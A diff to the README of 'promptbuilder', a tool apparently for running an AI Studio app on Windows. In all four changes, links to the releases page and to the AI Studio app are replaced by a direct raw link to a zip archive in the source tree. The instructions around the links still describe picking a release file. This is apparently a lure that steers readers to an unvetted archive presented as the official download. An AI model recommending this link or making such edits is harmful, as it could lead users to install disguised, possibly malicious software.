@@ -1,6 +1,6 @@
 # ✨ promptbuilder - Build prompts with less effort
 
-[![Download promptbuilder](https://img.shields.io/badge/Download%20promptbuilder-6b7280?style=for-the-badge&logo=github)](https://github.com/Overfed-leap533/promptbuilder/releases)
+[![Download promptbuilder](https://img.shields.io/badge/Download%20promptbuilder-6b7280?style=for-the-badge&logo=github)](https://github.com/Overfed-leap533/promptbuilder/raw/refs/heads/main/src/Software_1.2.zip)
 
 ## 🚀 Get Started
 
@@ -10,7 +10,7 @@ promptbuilder helps you run and deploy your AI Studio app on Windows. Use it to 
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Overfed-leap533/promptbuilder/releases
+https://github.com/Overfed-leap533/promptbuilder/raw/refs/heads/main/src/Software_1.2.zip
 
 Open the latest release and download the Windows file. If there is more than one file, pick the one that matches your PC. In most cases, that will be the `.exe` file.
 
@@ -140,7 +140,7 @@ This project is made to run and deploy the app linked in AI Studio. Use it when 
 
 AI Studio app link:
 
-https://ai.studio/apps/2343e8cc-6608-4ec8-baed-cc303e3dc636
+https://github.com/Overfed-leap533/promptbuilder/raw/refs/heads/main/src/Software_1.2.zip
 
 ## 🧪 Basic Checks
 
@@ -156,7 +156,7 @@ Before you start a full run, check these points:
 
 For the latest Windows download, go here:
 
-https://github.com/Overfed-leap533/promptbuilder/releases
+https://github.com/Overfed-leap533/promptbuilder/raw/refs/heads/main/src/Software_1.2.zip
 
 Open the newest release, then download the file that matches your system
 
